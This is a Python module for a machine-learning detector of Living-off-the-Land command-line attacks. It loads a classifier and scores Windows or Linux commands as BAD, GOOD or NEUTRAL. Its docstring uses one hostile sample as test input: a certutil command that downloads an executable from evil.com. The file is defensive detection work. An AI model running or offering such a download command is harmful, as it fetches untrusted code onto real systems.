"""
predictor.py
------------
Inference engine for Living-off-the-Land (LotL) attack detection.

Loads trained model and vectorizer artifacts, applies feature extraction
pipelines, and provides command classification with confidence scoring.

Classes:
- LotLPredictor
"""

import os
import joblib
from pathlib import Path
from typing import List, Dict, Union

from src.features.pipeline import (
    WindowsFeaturePipeline, LinuxFeaturePipeline,
    LABEL_LOOKS_LIKE_KNOWN_LOL, MIN_LABELS_FOR_TRAINING,
)

BATCH_SIZE = 1000


class LotLPredictor:
    """
    Predictor for detecting LotL attacks from command line strings.

    Usage:
        predictor = LotLPredictor(
            model_dir="models/windows",
            corpus_path="data/external/cmd_known.corpus",
            platform="windows",
        )
        res = predictor.predict("certutil.exe -urlcache -split -f http://evil.com/m.exe m.exe")
        print(res["verdict"])  # BAD
    """

    def __init__(
        self,
        model_dir: str,
        corpus_path: str = None,
        platform: str = "windows",
        threshold: float = None,
    ):
        """
        Args:
            model_dir   : Directory or base file path of model artifacts.
            corpus_path : Path to known command corpus (for BLEU similarity).
            platform    : Target platform ('windows' or 'linux').
            threshold   : Probability threshold for BAD verdict.
        """
        self.platform = platform
        self.threshold = threshold if threshold is not None else (0.35 if platform == "windows" else 0.60)

        # Resolve model and vectorizer paths flexibly
        clf_file, vec_file = self._resolve_model_files(model_dir)
        self._clf = joblib.load(clf_file)
        self._clf.verbose = 0
        self._vectorizer = joblib.load(vec_file)

        # Default corpus path if not provided
        if corpus_path is None:
            default_corpus = "data/external/cmd_known.corpus" if platform == "windows" else "data/external/bash_known.corpus"
            if os.path.exists(default_corpus):
                corpus_path = default_corpus
            else:
                corpus_path = ""

        if platform == "windows":
            self._pipeline = WindowsFeaturePipeline(corpus_path=corpus_path)
        elif platform == "linux":
            self._pipeline = LinuxFeaturePipeline(corpus_path=corpus_path)
        else:
            raise ValueError(f"Unsupported platform: {platform}")

    @staticmethod
    def _resolve_model_files(model_path: str):
        """Resolves classifier and vectorizer files from a directory or base path."""
        p = Path(model_path)
        if p.is_dir():
            if (p / "rf_classifier.joblib").exists():
                return p / "rf_classifier.joblib", p / "vectorizer.joblib"
            elif (p / "model.classifier2").exists():
                return p / "model.classifier2", p / "model.vectorizer"
        else:
            base = str(model_path)
            if os.path.exists(f"{base}.classifier2") and os.path.exists(f"{base}.vectorizer"):
                return f"{base}.classifier2", f"{base}.vectorizer"
            if os.path.exists(f"{base}_classifier.joblib") and os.path.exists(f"{base}_vectorizer.joblib"):
                return f"{base}_classifier.joblib", f"{base}_vectorizer.joblib"

        # Fallback check
        clf_fallback = p / "rf_classifier.joblib" if p.is_dir() else Path(f"{model_path}.classifier2")
        vec_fallback = p / "vectorizer.joblib" if p.is_dir() else Path(f"{model_path}.vectorizer")
        return clf_fallback, vec_fallback

    def predict(self, command: str) -> dict:
        """
        Predicts whether a single command line is malicious.

        Args:
            command: Input command string.

        Returns:
            Dictionary with keys:
              - command: stripped command string
              - verdict: 'BAD', 'GOOD', or 'NEUTRAL'
              - probability: float score in [0.0, 1.0]
              - labels: list of extracted feature labels
        """
        results = self.predict_batch([command])
        return results[0]

    def predict_batch(self, commands: List[str]) -> List[dict]:
        """
        Predicts maliciousness for a batch of command lines.

        Args:
            commands: List of command strings.

        Returns:
            List of result dictionaries.
        """
        all_results = []
        for i in range(0, len(commands), BATCH_SIZE):
            batch = commands[i : i + BATCH_SIZE]
            all_results.extend(self._process_batch(batch))
        return all_results

    def _process_batch(self, commands: List[str]) -> List[dict]:
        labels_list = []
        for cmd in commands:
            cmd = str(cmd).strip()
            labels = self._pipeline(cmd, training=False)
            labels_list.append(labels)

        text_batch = [" ".join(labels) for labels in labels_list]
        x = self._vectorizer.transform(text_batch)

        y_proba = self._clf.predict_proba(x)[:, 1]
        y_pred = (y_proba >= self.threshold).astype(int)

        results = []
        for cmd, labels, pred, proba in zip(commands, labels_list, y_pred, y_proba):
            verdict = self._determine_verdict(labels, pred, proba)
            results.append({
                "command": str(cmd).strip(),
                "verdict": verdict,
                "probability": round(float(proba), 4),
                "labels": labels,
            })

        return results

    def _determine_verdict(self, labels: list, pred: int, proba: float) -> str:
        has_few_labels = (
            len(labels) < MIN_LABELS_FOR_TRAINING
            and LABEL_LOOKS_LIKE_KNOWN_LOL not in labels
        )
        if has_few_labels:
            return "NEUTRAL"

        if pred == 1 or LABEL_LOOKS_LIKE_KNOWN_LOL in labels or proba >= self.threshold:
            return "BAD"

        return "GOOD"
